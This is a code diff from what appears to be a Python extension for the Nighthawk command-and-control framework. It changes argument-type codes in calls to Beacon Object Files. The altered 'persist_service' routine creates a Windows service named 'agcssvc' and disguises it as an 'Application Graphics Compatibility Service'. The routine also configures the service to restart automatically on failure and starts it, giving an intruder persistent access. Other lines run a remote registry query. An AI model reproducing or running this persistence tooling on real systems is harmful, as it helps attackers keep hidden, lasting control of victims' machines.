@@ -573,7 +573,7 @@ def reg_query_recursive(params, info):
         if len(command_params) >= 3:
             path = command_params[2]
 
-    packed_params = pack_params(f"z{hostname}", f"i{hive}", f"z{path}", "s", f"i{recursive_flag}")
+    packed_params = pack_params(f"z{hostname}", f"i{hive}", f"z{path}", "z", f"i{recursive_flag}")
     if type(packed_params) != bytes:
         return False
 
@@ -1515,11 +1515,11 @@ def persist_service(params, info):
     if len(command_params) >= 2: domain = command_params[1]
 
     packed_params = pack_params(
-        "s",
-        "sagcssvc",
-        "sC:\\Windows\\System32\\agcssvc.exe",
-        "sApplication Graphics Compatibility Service",
-        "sEnables enhanced compatibility and rendering for legacy applications using AGC graphics components.",
+        "z",
+        "zagcssvc",
+        "zC:\\Windows\\System32\\agcssvc.exe",
+        "zApplication Graphics Compatibility Service",
+        "zEnables enhanced compatibility and rendering for legacy applications using AGC graphics components.",
         f"s{0}",
         f"s{2}",
         f"s{16}"
@@ -1531,14 +1531,14 @@ def persist_service(params, info):
     base_execute_bof("sc_create", "bin/Remote/sc_create/sc_create", save_to_file, output_to_console, open_in_notepad, packed_params, info)
 
     nighthawk.console_write(CONSOLE_INFO, "configure auto restart on failure for windows service \"agcssvc\" with sc_failure BOF")
-    packed_params = pack_params("s", "sagcssvc", f"i{3}", "s", "s", f"s{3}", "s1/1/1/1/1/1")
+    packed_params = pack_params("z", "zagcssvc", f"i{3}", "z", "z", f"s{3}", "z1/1/1/1/1/1")
     if type(packed_params) != bytes:
         return False
 
     base_execute_bof("sc_failure", "bin/Remote/sc_failure/sc_failure", save_to_file, output_to_console, open_in_notepad, packed_params, info)
 
     nighthawk.console_write(CONSOLE_INFO, "start windows service \"agcssvc\" with sc_start BOF")
-    packed_params = pack_params("s", "sagcssvc")
+    packed_params = pack_params("z", "zagcssvc")
     if type(packed_params) != bytes:
         return False
 
